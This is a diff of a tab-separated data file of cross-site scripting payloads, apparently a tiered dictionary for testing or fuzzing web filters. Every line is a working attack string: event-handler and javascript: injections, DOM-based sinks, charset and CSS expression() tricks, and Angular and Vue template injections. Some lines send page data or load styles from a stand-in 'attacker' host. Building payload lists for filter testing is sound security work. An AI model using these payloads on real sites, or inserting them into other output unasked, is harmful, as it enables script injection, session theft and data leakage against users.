@@ -7,20 +7,66 @@ x1	<a onmouseover=alert(1)></a>	記号
 x1	'><body/onhashchange=alert('XSS')><a href=#>click</a>	記号
 x1	x" onmouseover="alert('XSS');	記号
 x1	javascript:alert('XSS');	記号
-x2	<q/oncut=alert('XSS')>	記号
-x2	<q/oncopy=alert('XSS')>	記号
-x2	<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>	記号
-x3	<img language=vbs src=<b onerror=alert#1/1#>	記号
-x3	<body language=vbs onload=alert-1	記号
-x3	<script language=vbs>msgbox+1</script/comeone>	記号
-x3	<script>//@cc_on alert@cc_on/* */(1)</script>	記号
-x3	<body/onload="@set @evil=1; @if(@evil)eval(alert(@evil))@end;">	記号
-x3	<div style="left:expression( alert('XSS'))">	記号	CSSXSS
-x3	<div style="left:exp/* */ression( alert('XSS'))">	記号	CSSXSS
-x3	<div style="left:&#x0065;xpression( alert('XSS'))">	記号	CSSXSS
-x3	<div style="left:\0065\0078pression( alert('XSS'))">	記号	CSSXSS
-x3	<div/style="width:expression(confirm(1))">X</div>	記号	CSSXSS
-x3	<li style="color:rgb(''0,0,&amp;#0;javascript:expression(confirm(1))">XSS</li>	記号	CSSXSS
-x3	<iframe src="#" style=width:exp/**/ressi/**/on(confirm(1))>	記号	CSSXSS
-x3	<input/type=hidden style=&#96;x:expression(alert(/XSS/))&#96;>	記号	CSSXSS
-x3	<div style="color:rgb(''&#amp;0;x:expression(alert(1))"></div>	記号	CSSXSS
+x1	<q/oncut=alert('XSS')>	記号
+x1	<q/oncopy=alert('XSS')>	記号
+x1	<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>	記号
+x2	<script>var q="";alert(1)//"</script>	記号
+x2	<a href="javascript:alert(1)">Link</a>	記号
+x2	<div>`-alert(1)</script><script>`</div><div>`-alert(1)</script><script>`</div>	記号
+x2	<svg o<script>nload=alert(1)>	記号
+x2	<script>/&/-alert(1)</script>	記号
+x2	<script>location.href=decodeURIComponent(location.hash.slice(1));</script>	記号
+x2	<script>document.body.innerHTML=decodeURIComponent(location.hash.slice(1));</script>	記号
+x2	<a href=https://attacker/>Session expired. Please login again.</a>	記号
+x2	<p><img src="https://attacker/?data=</p>	記号
+x2	<link rel=stylesheet href=//attacker/test.css>	記号
+x2	<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>	記号
+x2	<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>	記号
+x2	<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>	記号
+x2	<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>	記号
+x2	<div> <a href=/**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>	記号
+x2	PATH_INFO:/<link rel=import href="/bypass/path/<script>alert(1)</script>">	記号
+x2	<script src=/bypass/usercontent/xss.js></script>	記号
+x2	<link rel=import href=/bypass/usercontent/icon.jpg>	記号
+x2	<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}	記号
+x2	<link rel=import href=angular.html><p ng-app>{{constructor.constructor('alert(1)')()}}	記号
+x2	<link rel=import href=/bypass/vue.html><div id=app>{{constructor.constructor('alert(1)')()}}	記号
+x2	<link rel=import href=/bypass/underscore.html><script id=template>//<%alert`1`%></script>	記号
+x2	<link rel=import href=/bypass/babel-standalone.html><svg><script type=text/jsx>//<!--alert(1)//--></svg><script>0</script>	記号
+x3	<div><embed allowscriptaccess=always src=/xss.swf><base href=//l0.cm/</div>	記号
+x3	<div> <embed allowscriptaccess=always src=/xss.swf><base href="//l0.cm/ </div><div id="x"></div>	記号
+x4	<script>var q="";location='javascript\x3Aalert\x281\x29'//"</script>	記号
+x4	<script>location.href=decodeURIComponent(location.hash.slice(1));</script>	記号
+x4	<script>document.body.innerHTML=decodeURIComponent(location.hash.slice(1));</script>	記号
+x4	<script>document.write(location.hash.slice(1));</script>	記号
+x4	<div>"src=data:,alert%281%29></script><script x="</div><div>"src=data:,alert%281%29></script><script x="</div>	記号
+x4	<svg o<script>nload=alert(1)>	記号
+x4	<script/&>alert(1)</script>	記号
+x4	<p><img src="https://attacker/?data=</p>	記号
+x4	<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>	記号
+x4	<x~ onfocus=alert(1) id=a tabindex=0>	記号
+x4	<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;</x:script>	記号
+x4	+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-	記号
+x4	<?PXML><html:script>alert(1)</html:script>	記号
+x4	<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>	記号
+x4	<a href="?q=javascript%3Aalert(1)">Link</a>	記号
+x4	<option>&lt;script>alert(1)&lt;/script>	記号
+x4	<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>	記号
+x4	<svg><style>&commat;import'//attacker'</style>	記号
+x4	<svg><style>@&bsol;0069mport'//attacker'</style>	記号
+x4	<p style="behavior&colon;url('/bypass/usercontent/xss.txt')">	記号
+x4	<p style="behavior:url&lpar;'/bypass/usercontent/xss.txt')">	記号
+x5	<img language=vbs src=<b onerror=alert#1/1#>	記号
+x5	<body language=vbs onload=alert-1	記号
+x5	<script language=vbs>msgbox+1</script/comeone>	記号
+x5	<script>//@cc_on alert@cc_on/* */(1)</script>	記号
+x5	<body/onload="@set @evil=1; @if(@evil)eval(alert(@evil))@end;">	記号
+x5	<div style="left:expression( alert('XSS'))">	記号	CSSXSS
+x5	<div style="left:exp/* */ression( alert('XSS'))">	記号	CSSXSS
+x5	<div style="left:&#x0065;xpression( alert('XSS'))">	記号	CSSXSS
+x5	<div style="left:\0065\0078pression( alert('XSS'))">	記号	CSSXSS
+x5	<div/style="width:expression(confirm(1))">X</div>	記号	CSSXSS
+x5	<li style="color:rgb(''0,0,&amp;#0;javascript:expression(confirm(1))">XSS</li>	記号	CSSXSS
+x5	<iframe src="#" style=width:exp/**/ressi/**/on(confirm(1))>	記号	CSSXSS
+x5	<input/type=hidden style=&#96;x:expression(alert(/XSS/))&#96;>	記号	CSSXSS
+x5	<div style="color:rgb(''&#amp;0;x:expression(alert(1))"></div>	記号	CSSXSS
